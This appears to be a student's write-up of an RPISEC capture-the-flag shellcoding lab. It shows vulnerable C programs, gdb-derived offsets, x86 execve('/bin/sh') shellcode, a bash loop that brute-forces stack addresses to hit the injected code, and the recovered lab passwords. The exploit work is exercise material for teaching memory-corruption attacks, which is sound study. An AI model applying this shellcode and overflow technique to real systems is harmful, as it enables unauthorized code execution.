# Warzone Lab03: Shellcoding

## Lab03C:

```c
/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */

char a_user_name[100];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "rpisec", 6);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

int main()
{
    char a_user_pass[64] = {0};
    int x = 0;

    /* prompt for the username - read 100 bytes */
    printf("********* ADMIN LOGIN PROMPT *********\n");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    /* verify input username */
    x = verify_user_name();
    if (x != 0){
        puts("nope, incorrect username...\n");
        return EXIT_FAILURE;
    }

    /* prompt for admin password - read 64 bytes */
    printf("Enter Password: \n");
    fgets(a_user_pass, 0x64, stdin);

    /* verify input password */
    x = verify_user_pass(a_user_pass);
    if (x == 0 || x != 0){
        puts("nope, incorrect password...\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```

Since the last lab we've lost our `shell()` function. This time, we'll have to inject the shellcode ourselves, and then jump to wherever we injected it.

Since `a_user_pass` is on the stack, this looks like a good candidate to overflow. `fgets` is reading `0x64=100` bytes into a 64 byte buffer so this will likely get us to the return address. Let's start by overflowing this buffer and causing a crash. There's no ASLR for now, so we can use this to determine where our return address should be.

```
rpisec
...............................................................abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
```
Running `lab3C` with `gdb` and the above file as input, we crash with a segmentation fault at `0x75747372` -> `utsr`. Now we know where we want to inject our return address:

```
rpisec
...............................................................abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
                                                                                ^^^^
```

This gives us 80 bytes to work with for our shellcode and NOP sled. Stepping through our program with `gdb`, we can also find the address of stack frame when `main()` begins (`0xbffff670`). This will give us a good target to return to.

We can steal a shellcode payload from google, the one below executes `execve("/bin/sh")`. The shellcode below does a few things to setup this call:
1. Set `eax` to NULL
2. Push `"/bin//sh"` onto the stack.
3. Make `ebx` a pointer to `"/bin//sh"`
4. Make `ecx` NULL
5. Make `edx` NULL
6. Make the lower 8 bits of `eax` == `0xb` (this is the syscall table entry for `execve`)
7. Calls the syscall with `int 0x80`
8. Calls `exit(1)` to gracefully exit

```
31 c0                 xor    eax, eax
50                    push   eax
68 2f 2f 73 68        push   0x68732f2f
68 2f 62 69 6e        push   0x6e69622f
89 e3                 mov    ebx, esp
89 c1                 mov    ecx, eax
89 c2                 mov    edx, eax
b0 0b                 mov    al, 0xb
cd 80                 int    0x80
31 c0                 xor    eax, eax
40                    inc    eax
cd 80                 int    0x80
```

We can insert this into our `a_user_pass` variable, but we get some bugs, notably a `Illegal instruction (core dumped)`. This could be that the `main()` function changes the stack that we just worked so hard to overwrite, making our shellcode unusable. Another possibility is that our return address is incorrect. I believe it's the latter, and reusing the same address we find the buffer when running with `gdb` is the issue.

Instead, let's put our shellcode in the `a_user_name` and try to jump to that. The hypothesis being that the global varibles won't move around as much as the stack.

We can find the address of `a_user_name` with `gdb` using `p &a_user_name` == `0x8049c40`. We still have to keep `rpisec` inside the array, so we want to jump 6 bytes after this string to hit our shellcode. Hence, our target address is `0x8049c46`.

And we get our shell!

`(cat /tmp/lab3C.txt; cat) | ./lab3C`

`lab3B:th3r3_iz_n0_4dm1ns_0n1y_U!`

I'd like to go back to this at some point and brute force the stack only attack. It should be easy enough, starting at the address we find with `gdb` increment the target address by 16 bytes and keep trying until we hit out shellcode.

### Alternate Solution

What a nightmare! Here's what we learned:
1. Putting your shellcode at the end of the buffer isn't always a great idea since that part of the buffer isn't safe from being changed! At first I thought this gives the largest NOP sled, which it would, but it also lets your shellcode be changed which took a while to figure out.
2. The addresses on the stack will change between runs, and depending on how you run the program. The best way around this is to brute force around a hypothesis address and check the return code. Further, you want to rerun the command within the same script. 

```shell
#!/bin/bash
for offset in $(seq -1024 4 1024); do
    echo "[*] Running with offset: $offset"
    python /tmp/lab3C+.py $offset | ./lab3C > /dev/null
    if [ $? -eq 0 ]; then
        (python /tmp/lab3C+.py $offset; cat) | ./lab3C
    fi
done
```



## Lab03B

```C
#include <signal.h>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <wait.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */

/* hint: write shellcode that opens and reads the .pass file.
   ptrace() is meant to deter you from using /bin/sh shellcode */

int main()
{
    pid_t child = fork();
    char buffer[128] = {0};
    int syscall = 0;
    int status = 0;

    if(child == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        /* this is all you need to worry about */
        puts("just give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        /* mini exec() sandbox, you can ignore this */
        while(1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)){
                puts("child is exiting...");
                break;
            }

            /* grab the syscall # */
            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);

            /* filter out syscall 11, exec */
            if(syscall == 11)
            {
                printf("no exec() for you\n");
                kill(child, SIGKILL);
                break;
            }
        }
    }

    return EXIT_SUCCESS;
}
```

```
..............................................................................................................................abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890

```


156 bytes


wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd


## Lab03A

